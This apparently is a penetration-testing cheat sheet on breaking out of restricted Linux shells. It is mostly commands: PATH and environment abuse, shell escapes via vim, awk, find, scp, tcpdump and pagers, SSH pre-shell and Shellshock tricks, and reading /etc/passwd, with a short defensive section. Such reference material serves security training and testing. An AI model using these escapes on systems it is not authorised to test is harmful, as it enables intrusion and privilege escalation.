## Overview

A restricted shell limits the commands a user can execute or restricts execution to specific directories. These shells are commonly deployed in enterprise environments to reduce the attack surface for low-privilege users, contractors, or service accounts.

Common restricted shells:

| Shell | Description |
|------|-------------|
| **rbash** | Restricted Bourne shell |
| **rksh** | Restricted Korn shell |
| **rzsh** | Restricted Z shell |

Typical restrictions include:

- preventing directory changes (`cd`)
- blocking absolute path execution (`/bin/bash`)
- restricting environment variable modification
- limiting available binaries
- disabling shell redirection (`>`, `>>`)
- preventing execution of arbitrary commands

Despite these restrictions, many escape techniques exist.

---

# Initial Reconnaissance

Identify current shell and available binaries:

```bash
echo $0
echo $SHELL
env
echo $PATH
```

If `ls` is restricted, glob directories:

```bash
echo /usr/local/rbin/*
```

List exported variables:

```bash
export -p
```

Key indicators:

- writable PATH directories
- accessible interpreters (python, perl, awk)
- editors (vim, vi, nano)
- file transfer tools (scp, ftp, curl)
- debugging tools (gdb)

---

# Command Injection Escape

If arguments are allowed but commands are restricted, inject commands into permitted operations.

Example:

```bash
ls -l `pwd`
```

Command substitution executes:

```bash
pwd
```

Alternative syntax:

```bash
ls -l $(pwd)
```

---

# Command Chaining

Use shell metacharacters to run multiple commands:

```bash
ls; id
ls | /bin/sh
```

Common separators:

| Operator | Function |
|----------|----------|
| `;` | sequential execution |
| `&&` | execute if previous succeeds |
| `|` | pipe output |
| `||` | execute if previous fails |

---

# Environment Variable Abuse

If environment variables are writable:

```bash
export SHELL=/bin/bash
export PATH=/tmp:$PATH
```

Execute unrestricted shell:

```bash
$SHELL
```

---

# Writable PATH Abuse

If PATH contains writable directories, drop malicious binaries:

```bash
echo '/bin/bash' > ls
chmod +x ls
./ls
```

---

# Shell Function Abuse

Define functions that spawn shells:

```bash
function shell() { /bin/sh; }
shell
```

---

# Copying Files into PATH

If direct execution is restricted but PATH contains writable locations:

```bash
cp /bin/bash /tmp/bash
chmod +x /tmp/bash
/tmp/bash
```

---

# Program-Based Escapes

Many legitimate programs allow shell execution.

---

## Vim Escape

```bash
vim file.txt
```

Inside vim:

```vim
:set shell=/bin/bash
:shell
```

Execute command directly:

```vim
:! /bin/sh
```

---

## AWK Escape

```bash
awk 'BEGIN {system("/bin/sh")}'
```

Using find:

```bash
find / -name test -exec awk 'BEGIN {system("/bin/sh")}' \;
```

---

## Find Escape

```bash
find . -exec /bin/sh \; -quit
```

---

## SCP Escape

Read arbitrary files:

```bash
scp -F /etc/passwd x y:
```

Execute commands via custom SSH program:

```bash
echo '#!/bin/sh' > script.sh
echo '/bin/sh' >> script.sh
chmod +x script.sh

scp -S ./script.sh file user@host:
```

---

## TCPDump Escape

```bash
tcpdump -n -G 1 -z /usr/bin/php -U -A udp port 8080
```

Trigger execution:

```bash
echo "<?php system('id');?>" | nc -u 127.0.0.1 8080
```

---

## Pager Escapes

Programs such as:

- less
- more
- man
- ftp
- gdb

allow shell execution:

```bash
! /bin/sh
```

# Unrestricted Profile Abuse

Some restricted shells execute profiles before restrictions apply.

If writable:

```bash
~/.bash_profile
~/.profile
```

Insert:

```bash
/bin/bash
```

---

# SSH Escape Techniques

Execute command before restricted shell loads:

```bash
ssh user@target -t "/bin/sh"
```

Start shell without profile restrictions:

```bash
ssh user@target -t "bash --noprofile"
```

Shellshock technique:

```bash
ssh user@target -t '(){ :; }; /bin/bash'
```

---

# Output Redirection Bypass

If `>` is restricted:

```bash
echo test | tee file.txt
```

Append:

```bash
echo test | tee -a file.txt
```

find / -writable -type d 2>/dev/null

# Typical Attack Flow

1. identify shell restrictions
2. enumerate PATH
3. identify available binaries
4. test command chaining
5. attempt interpreter escape
6. exploit editor escape
7. abuse environment variables
8. attempt SSH pre-shell execution
9. escalate privileges

---

# Defensive Controls

Mitigation strategies include:

- limiting available binaries
- restricting PATH directories
- disabling interpreters
- enforcing command whitelisting
- using containerized shells
- auditing GTFOBins-capable tools
- monitoring shell escapes
- enforcing least privilege

---

# Key Takeaways

- restricted shells reduce attack surface but rarely eliminate escape paths
- many legitimate programs allow shell execution
- interpreters provide reliable escape vectors
- PATH misconfiguration significantly weakens restrictions
- GTFOBins is essential reference resource
- enumeration of available binaries is critical
- restricted shells should never be considered a strong security boundary
